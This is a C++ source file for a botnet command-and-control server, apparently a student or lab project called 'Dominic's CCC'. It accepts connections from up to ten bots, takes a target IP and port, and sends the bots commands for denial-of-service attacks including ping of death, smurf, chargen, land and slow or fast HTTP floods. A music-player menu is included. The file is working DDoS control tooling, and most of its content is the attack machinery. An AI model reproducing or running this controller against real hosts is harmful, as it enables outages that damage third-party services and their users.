#include <stdlib.h>
#include <iostream>
#include <string.h>
#include <fstream>
#include <thread>
#include <signal.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <vector>
#include <sstream>
#include <filesystem>

using namespace std;

bool start = false;
bool server_started = false;
bool attacking = false;

string attack = "None";
string target_ip = "None";

thread tListener;
vector<thread> threads;
int target_port = 0;
int server_fd, valread, client_socket;
struct sockaddr_in server_address, client_address;
struct netbot {
	int id;
	bool start;
	string ip_address;
};

vector<netbot> netbots;
string message;

pid_t pid;

string server_status()
{	
	if (target_ip == "None" && attack == "None" && attacking == false)
	{
		return "\nServer started, waiting for client connections...\n";
	}
	else if (attack == "HALT" && target_ip != "None")
	{
		return "\nAttack halted. Waiting for commands.\n";
	}
	else if (attacking == true && attack == "None")
	{	
		attacking = false;
		return "\nPlease, enter attack type.\n";
	}
	else if (attacking == true && target_ip == "None")
	{
		attacking = false;
		return "\nPlease, enter target parameters.\n";
	}
	else if (attacking == true) 
	{
		return "\nServer attacking (" + attack + ") target: " + target_ip + "\n";
	}
	else
	{
		return "\nServer started, waiting for client connections...\n";
	}
}

void setup_target_parameters()
{	
	cout << "Enter target ip address: ";
	cin >> target_ip;
	cout << "\n Enter target port: ";
	cin >> target_port;
}

void start_attack()
{	
	if (attack != "None" && target_ip != "None" && target_port != 0)
       	{	
		vector<netbot>::iterator iter = netbots.begin();
		for(iter; iter < netbots.end(); iter++) 
		{	
	       		if (attack == "HALT") {
       				message = attack;
	       		} else {
	       			message = attack + "_" + target_ip + "_" + to_string(target_port);

	       		}
	       			
			send((*iter).id, message.c_str(), strlen(message.c_str()), 0);
		}
	}
}

void close_connected_sockets()
{
	vector<netbot>::iterator iter = netbots.begin();
	for(iter; iter < netbots.end(); iter++) 
	{	
       		close((*iter).id);
	}
}

void printASCII(string fileName)
{
	string line = "";
	ifstream inFile;
	inFile.open(fileName);
	if (inFile.is_open())
	{
		while(getline(inFile, line))
		{
			cout << line << endl;
		}
	} else {
		cout << "File failed to load. " << endl;
		cout << "Nothing to display." << endl;
	}
	inFile.close();
}


void menu_header()
{
	string fileName = "dos_art.txt";
	printASCII(fileName);
}

void list_bots()
{	
	system("clear");
	menu_header();
	cout << "\n\nBots connected " << "(" << netbots.size() <<"):\n";
	vector<netbot>::iterator iter = netbots.begin();

	for(iter; iter < netbots.end(); iter++) 
	{
		cout << "bot: " << (*iter).ip_address << "\n";
	}

	cout << "\nPress any key to exit...";

	cin.ignore();
	cin.get();
}

void setup_attack_type()
{
	char char_choice[1];
	int int_choice = 0;
	do
	{
		system("clear");
		menu_header();
		cout << "\n";
		cout << "Attack options: \n\n";
		cout << "1. Ping of death attack\n";
		cout << "2. Smurf attack\n";
		cout << "3. Chargen attack\n";
		cout << "4. Land attack\n";
		cout << "5. Slow HTTP attack\n";
		cout << "6. Fast HTTP attack\n";
		cout << "7. exit\n";

		cin >> char_choice;
		int_choice = atoi(char_choice);

		
		switch(int_choice) 
		{
			case 1: 
				attack = "POD";
				break;
			case 2:
				attack = "SMURF";
				break;
			case 3:
				attack = "CHARGEN";
				break;
			case 4:
				attack = "LAND";
				break;
			case 5:
				attack = "SLOWHTTP";
				break;
			case 6:
				attack = "FASTHTTP";
				break;
			case 7:
				break;
			default:
				cout << "Wrong choice. Enter option again.";
				break;

		}
	} while (int_choice != 1 && int_choice != 2 && int_choice != 3 && int_choice != 4 && int_choice != 5 && int_choice != 6 && int_choice != 7);

}

void threaded(int i)
{
	char buffer[1024] = { 0 };	
	
	bzero(&buffer, sizeof(buffer));
	int bytes = recv(i, buffer, 1024, 0);	
	
	while(true)
	{
		bzero(&buffer, sizeof(buffer));
		int bytes = recv(i, buffer, 1024, 0);	

		if (bytes == 0) // netbot disconnected
		{	
			netbot bot;
			vector<netbot>::iterator iter = netbots.begin();
			for(iter; iter < netbots.end(); iter++) 
			{
				if ((*iter).id == i) 
				{	
					bot = *iter;
					netbots.erase(iter);
					iter--;
				}
			}
			
			cout << "\nNetbot (" << bot.ip_address << ") disconnected." << std::flush;
			
			close(i);
			
			sleep(3);
			cout << "\33[2K\r" << std::flush;
			cout << "\x1b[A";
						
			return;
		}
	}
}

void connection_listener(int i)
{
	while(netbots.size() != 10)
	{
		socklen_t client_length = sizeof(client_address);
		if ((client_socket = accept(server_fd, (struct sockaddr *) &client_address, &client_length)) < 0) {
			perror("accept");
			exit(EXIT_FAILURE);
		}

		netbots.push_back({ client_socket, false, inet_ntoa(client_address.sin_addr) });
		
		threads.push_back(thread(threaded, client_socket));
  		threads.back().detach();
  		
		cout << "client connected: " << inet_ntoa(client_address.sin_addr) << "\t Total Bots Connected: " << netbots.size() << endl;
	}

}


void start_server()
{
	if (server_started == false)
	{
		server_started = true;
		int opt = 1;
		int addrlen = sizeof(server_address);
		char buffer[1024] = { 0 };
		char* hello = "Hello from server";
	
		// Creating socket file descriptor
		if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
			perror("Socket failed");
			exit(EXIT_FAILURE);
		}

		// Forcefully attaching socket to the port specified
			if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
			perror("setsockopt");
			exit(EXIT_FAILURE);
		}

		server_address.sin_family = AF_INET;
		server_address.sin_addr.s_addr = inet_addr("10.0.2.4");
		server_address.sin_port = htons(8080);

		// Binding address and port to the socket
		if (bind(server_fd, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
			perror("bind failed");
			exit(EXIT_FAILURE);
		}

		// Wait for clients connections
		if (listen(server_fd, 10) < 0) {
			perror("listem");
			exit(EXIT_FAILURE);
		}
        
		tListener = thread(connection_listener, 1);
		tListener.detach();
	}
		
	char char_choice[1];
	int int_choice = 0;
	do
	{
		system("clear");
		menu_header();
		cout << "\n";
		cout << "Server options: \n\n";
		cout << "1. setup target parameters\n";
		cout << "2. setup attack type\n";
		cout << "3. start attack\n";
		cout << "4. halt attack\n";
		cout << "5. list connected bots\n";
		cout << "6. shutdown server\n";	
		cout << "7. exit\n";
		cout << server_status();

		cin >> char_choice;
		int_choice = atoi(char_choice);

		
		switch(int_choice) 
		{
			case 1: 
				setup_target_parameters();
				break;
			case 2:
				setup_attack_type();
				break;
			case 3: 
				start_attack();
				attacking = true;
				break;
			case 4: 
				attack = "HALT";
				start_attack();
				attacking = false;
				break;
			case 5:
				list_bots();
				break;
			case 6:
				kill(-pid, SIGKILL);
				close_connected_sockets();
				shutdown(server_fd, SHUT_RDWR);
				break;
			case 7:
				break;
			default:
				cout << "Wrong choice. Enter option again.";
				break;

		}
	} while (int_choice != 6 && int_choice != 7);
}

void play_music(string songName)
{	
	if (pid > 0) {
		kill(-pid, SIGKILL);
		cout << "\nkilled process group " << pid;
	}
	
	pid = fork();
	if (pid == 0) { // child procress
		setpgid(getpid(), getpid());
		string cmd = "canberra-gtk-play -f music/" + songName;
		system(cmd.c_str());
		exit(0);
	}
}

string format_filename_output(string path)
{
	string s(path);
	stringstream filename(s);
	string segment;
	vector<string> seglist;

	while(getline(filename, segment, '/'))
	{
	   seglist.push_back(segment);
	}
	
	return seglist[seglist.size() - 1];
}

void music_menu()
{	 	
 	char char_choice[1];
	int int_choice = 0;

	while(true)
	{
		vector<string> music_list;
		string path = string(get_current_dir_name()) + string("/music");
	    	for (const auto & entry : filesystem::directory_iterator(path)) {
	    		music_list.push_back(format_filename_output(entry.path()));
	    	}
		system("clear");
		menu_header();
		cout << "\n";
		cout << "Select music to play: \n\n";
		for (int i = 1; i <= music_list.size(); i++)
		{
			cout << i << ". " << music_list[i - 1] << "\n";
		}
		cout << to_string(music_list.size() + 1) + ". Stop music\n";
		cout << to_string(music_list.size() + 2) + ". Exit\n";
		
		cin >> char_choice;
		int_choice = atoi(char_choice);
		
		if (int_choice >= 1 && int_choice <= music_list.size()) 
		{
			play_music(music_list[int_choice - 1]);
		}
		else if (int_choice > music_list.size() && (int_choice - music_list.size()) <= 2)
		{
			if ((int_choice - music_list.size()) == 1)
			{
				if (pid > 0) {
					kill(-pid, SIGKILL);
					cout << "\nMusic stopped: " << pid;
				}
			} else {
				return;
			}
		}
		else
		{
			cout << "Wrong choice. Enter option again.";
		}
	}
}

void main_menu()
{
	char char_choice[1];
	int int_choice = 0;
	do
	{
		system("clear");
		menu_header();
		cout << "\n";
		cout << "Dominic's CCC menu selection: \n\n";
		cout << "1. start server\n";
		cout << "2. music_menu\n";
		cout << "3. Exit\n";
		cin >> char_choice;
		int_choice = atoi(char_choice);

		
		switch(int_choice) 
		{
			case 1:
				start_server();
				break;
			case 2:
				music_menu();
				break;
			case 3:
				break;
			default:
				cout << "Wrong choice. Enter option again.";
				break;

		}
	} while(int_choice != 3);
}

void signal_callback_handler(int signum) {
   if (pid > 0) kill(-pid, SIGKILL);
   exit(signum);
}

int main()
{	
	signal(SIGINT, signal_callback_handler);
	main_menu();
	if (pid > 0) kill(-pid, SIGKILL);
	cout << "\nThank you for using dominic's CCC. Have a great day!";
	return 0;
}
